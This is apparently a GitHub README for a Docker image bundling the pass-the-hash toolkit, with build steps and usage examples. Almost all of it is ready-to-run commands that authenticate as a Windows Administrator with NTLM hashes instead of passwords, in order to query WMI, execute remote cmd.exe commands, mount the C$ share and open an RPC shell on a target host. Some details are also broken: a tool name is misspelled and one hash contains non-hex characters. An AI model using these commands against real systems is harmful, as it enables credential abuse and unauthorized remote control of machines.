# pth-toolkit docker

This docker build comes from the frustrating attempts
to run the pass-the-hash toolkit with libreadline6 and
python2 without messing up the system.

You can build your pth-toolkit docker image by executing:
```sh
git clone https://github.com/gnebbia/pth-toolkit-docker
cd pth-toolkit-docker
docker build -t gnc/pth-toolkit .
```

Once the image is created we can launch any pth-tool by doing:
```sh
docker run -it --rm gnc/pth-toolkit pth-smbclient $arg1 $arg2 
```

The list of launchable executables is:

- pth-net
- pth-rpcclient
- pth-smbclient
- pth-smbget
- pth-winexe
- pth-wmic
- pth-wmis

# How to pass the hash with the pth-toolkit: Examples

## Execute WMI queries
```sh
docker run -it --rm gnc/pth-toolkit \
pth-wmic -U WORKGROUP/Administrator%aad3b435b51407eeaberb435b51404ee:D162E311D3F450A7FF2571BB59FBEDE5 \
//192.168.1.25 "select Name from Win32_UserAccount"
```

## Execute WMI commands
```sh
docker run -it --rm gnc/pth-toolkit \
pth-wims -U WORKGROUP/Administrator%aad3b435b51807eeaad3b435b51404ee:D292E311D3F450A7FF2571BB89FAEDE5 \
//192.168.1.25 "cmd.exe /c whoami > c:\temp\result.txt"
```

## Connect with SMB shares
```sh
docker run -it --rm gnc/pth-toolkit \
pth-smbclient -U WORKGROUP/Administrator%abd3b485b51404eeaad3b435b51404ee:A052E311D3F450AAFFA571AB59FBEDE5 \
//192.168.1.25/c$
```

## Connect with an SMB shell
```sh
docker run -it --rm gnc/pth-toolkit \
pth-rpcclient -U WORKGROUP/Administrator%ba282037831412aeaad3b435b51404ee:CAF2A311DAF450AAB26571BB59FBEDE5 //192.168.1.25
```
